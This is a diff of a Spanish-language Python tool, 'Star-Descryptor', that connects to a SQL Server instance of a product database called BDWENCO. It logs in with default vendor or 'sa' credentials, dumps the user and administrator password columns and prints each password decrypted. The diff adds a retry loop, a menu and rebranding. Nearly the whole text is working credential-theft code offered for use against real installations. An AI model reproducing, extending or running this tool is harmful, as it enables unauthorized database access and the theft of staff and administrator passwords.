@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 import sys
+import os
 import getpass
 
 try:
@@ -30,11 +31,14 @@ BANNER = r"""
  ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝ ╚═╝  ╚═╝
 """
 
+def limpiar():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
 def print_banner():
     linea = "=" * 78
     print(VERDE + linea + RESET)
     print(VERDE + BOLD + BANNER + RESET)
-    print(BOLD + "  >> Star-Descryptor v1.8  |  by Mr-R360  |  remoto360.com <<" + RESET)
+    print(BOLD + "  >> Star-Descryptor v1.9  |  by Mr-R360  |  github.com/Mr-R360 <<" + RESET)
     print(VERDE + linea + RESET)
     print()
 
@@ -71,7 +75,7 @@ def descifrar(texto_cifrado):
 
 
 # ─────────────────────────────────────────────
-#  PARÁMETROS AL INICIO
+#  PARÁMETROS
 # ─────────────────────────────────────────────
 def pedir_parametros():
     print(BOLD + "  [ CONFIGURACIÓN DE CONEXIÓN ]" + RESET)
@@ -80,7 +84,7 @@ def pedir_parametros():
     ip = input("  IP del servidor          : ").strip()
     if not ip:
         err("IP requerida.")
-        sys.exit(1)
+        return None
 
     print()
     print("  Instancia SQL Server:")
@@ -89,7 +93,7 @@ def pedir_parametros():
     print("  [3] Ingresar manualmente")
     op_inst = input("  Opción [1/2/3]           : ").strip()
     if op_inst == "2":
-        instancia = "sqlexpress"
+        instancia = "SQLEXPRESS"
     elif op_inst == "3":
         instancia = input("  Nombre de instancia      : ").strip() or None
     else:
@@ -97,7 +101,7 @@ def pedir_parametros():
 
     print()
     print("  Credenciales SQL Server:")
-    print("  [1] SOPORTE / SOPORTE (por defecto)")
+    print("  [1] Credenciales por defecto del sistema")
     print("  [2] sa / (ingresar contraseña)")
     print("  [3] Ingresar usuario y contraseña manualmente")
     op_cred = input("  Opción [1/2/3]           : ").strip()
@@ -125,7 +129,7 @@ def conectar(ip, sql_user, sql_pass, instancia=None):
         err("pyodbc no está instalado.")
         print("    Ejecuta : apt-get install -y python3-pyodbc")
         print("    En Kali : pip3 install pyodbc --break-system-packages")
-        sys.exit(1)
+        return None
 
     servidor = f"{ip}\\{instancia}" if instancia else ip
     drivers = [
@@ -169,8 +173,8 @@ def leer_tabla(conn, tabla):
         cur.execute("SELECT USU_CODIGO, USU_NOMBRE, USU_PASSWORD, USU_CARGO, USU_ESTADO, USU_TIPO FROM BDWENCO.dbo.USUARIOS ORDER BY USU_CODIGO")
         cols = ["USU_CODIGO", "USU_NOMBRE", "USU_PASSWORD", "USU_CARGO", "USU_ESTADO", "USU_TIPO"]
     elif tabla == "ADMINISTRADOR":
-        cur.execute("SELECT ADM_CODIGO, ADM_NOMBRE, ADM_PASSWORD, EMAIL, CARGO FROM BDWENCO.dbo.ADMINISTRADOR ORDER BY ADM_CODIGO")
-        cols = ["ADM_CODIGO", "ADM_NOMBRE", "ADM_PASSWORD", "EMAIL", "CARGO"]
+        cur.execute("SELECT ADM_CODIGO, ADM_NOMBRE, ADM_PASSWORD FROM BDWENCO.dbo.ADMINISTRADOR ORDER BY ADM_CODIGO")
+        cols = ["ADM_CODIGO", "ADM_NOMBRE", "ADM_PASSWORD"]
     return cur.fetchall(), cols
 
 
@@ -182,13 +186,12 @@ def mostrar_tabla(filas, cols, titulo):
         info(f"Tabla {titulo} existe pero está vacía.")
         return
 
-    # Columna de password según tabla
     pwd_col = "ADM_PASSWORD" if "ADM_PASSWORD" in cols else "USU_PASSWORD"
     pwd_idx = cols.index(pwd_col)
 
     col_w = []
     for c in cols:
-        if c in ("ADM_NOMBRE", "USU_NOMBRE", "USU_CARGO", "CARGO", "EMAIL"):
+        if c in ("ADM_NOMBRE", "USU_NOMBRE", "USU_CARGO"):
             col_w.append(28)
         elif c in ("ADM_PASSWORD", "USU_PASSWORD"):
             col_w.append(22)
@@ -196,7 +199,6 @@ def mostrar_tabla(filas, cols, titulo):
             col_w.append(14)
     col_w_full = col_w + [22]
     headers = cols + ["PWD DESCIFRADO"]
-
     sep = "─" * (sum(col_w_full) + len(col_w_full) * 3 + 1)
 
     print()
@@ -229,42 +231,66 @@ def mostrar_tabla(filas, cols, titulo):
 
 
 # ─────────────────────────────────────────────
-#  MAIN
+#  MENÚ FINAL
 # ─────────────────────────────────────────────
-print_banner()
-
-ip, instancia, sql_user, sql_pass = pedir_parametros()
-
-print()
-info(f"Conectando a {ip}" + (f"\\{instancia}" if instancia else "") + " ...")
-
-conn = conectar(ip, sql_user, sql_pass, instancia)
-if not conn:
-    err("Conexión fallida. Verifica IP, instancia, credenciales, firewall o puerto 1433.")
-    sys.exit(1)
-
-try:
+def menu_final():
     print()
-    info("Buscando tablas en BDWENCO...")
-    encontrado = False
+    print(BOLD + "  ┌─────────────────────────────┐" + RESET)
+    print(BOLD + "  │  ¿Qué deseas hacer?          │" + RESET)
+    print(BOLD + "  │  [1] Consultar otro servidor  │" + RESET)
+    print(BOLD + "  │  [2] Salir                    │" + RESET)
+    print(BOLD + "  └─────────────────────────────┘" + RESET)
+    return input("  Opción [1/2]             : ").strip()
 
-    for tabla in ["USUARIO", "USUARIOS", "ADMINISTRADOR"]:
-        if tabla_existe(conn, tabla):
-            filas, cols = leer_tabla(conn, tabla)
-            if filas:
-                encontrado = True
-                mostrar_tabla(filas, cols, tabla)
-            else:
-                info(f"Tabla {tabla} existe pero está vacía.")
-        
-    if not encontrado:
-        err("No se encontraron datos en ninguna tabla de usuarios.")
+
+# ─────────────────────────────────────────────
+#  MAIN LOOP
+# ─────────────────────────────────────────────
+while True:
+    limpiar()
+    print_banner()
+
+    params = pedir_parametros()
+    if not params:
+        continue
+
+    ip, instancia, sql_user, sql_pass = params
 
     print()
-    print(VERDE + BOLD + "[+] Star-Descryptor v1.8 — remoto360.com" + RESET)
-    print()
+    info(f"Conectando a {ip}" + (f"\\{instancia}" if instancia else "") + " ...")
 
-except Exception as e:
-    err(f"Error: {e}")
-finally:
-    conn.close()
+    conn = conectar(ip, sql_user, sql_pass, instancia)
+    if not conn:
+        err("Conexión fallida. Verifica IP, instancia, credenciales, firewall o puerto 1433.")
+    else:
+        try:
+            print()
+            info("Buscando tablas en BDWENCO...")
+            encontrado = False
+
+            for tabla in ["USUARIO", "USUARIOS", "ADMINISTRADOR"]:
+                if tabla_existe(conn, tabla):
+                    filas, cols = leer_tabla(conn, tabla)
+                    if filas:
+                        encontrado = True
+                        mostrar_tabla(filas, cols, tabla)
+                    else:
+                        info(f"Tabla {tabla} existe pero está vacía.")
+
+            if not encontrado:
+                err("No se encontraron datos en ninguna tabla de usuarios.")
+
+            print()
+            ok(f"Star-Descryptor v1.9 — github.com/Mr-R360")
+
+        except Exception as e:
+            err(f"Error: {e}")
+        finally:
+            conn.close()
+
+    opcion = menu_final()
+    if opcion != "1":
+        print()
+        print(VERDE + BOLD + "  Hasta luego." + RESET)
+        print()
+        break
